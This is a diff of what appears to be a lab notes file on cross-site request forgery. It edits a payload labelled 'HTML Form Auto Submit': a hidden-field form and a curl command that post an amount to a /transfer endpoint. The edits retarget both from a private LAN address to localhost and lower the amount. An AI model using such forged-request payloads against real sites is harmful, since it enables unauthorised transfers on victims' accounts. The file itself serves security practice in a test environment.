@@ -2,8 +2,8 @@
 
 ## Payload 1: HTML Form Auto Submit
 
-http://localhost:8080/transfer?amount=1000
-http://192.168.109.131:8080/balance
+curl -X POST -d "amount=100" http://localhost:8080/transfer
+http://localhost:8080/balance
 
 <!DOCTYPE html>
 <html lang="en">
@@ -15,8 +15,8 @@ http://192.168.109.131:8080/balance
 </head>
 
 <body>
-    <form action="http://192.168.109.131:8080/transfer" method="POST">
-        <input type="hidden" name="amount" value="1000">
+    <form action="http://localhost:8080/transfer" method="POST">
+        <input type="hidden" name="amount" value="100">
     </form>
 </body>
 
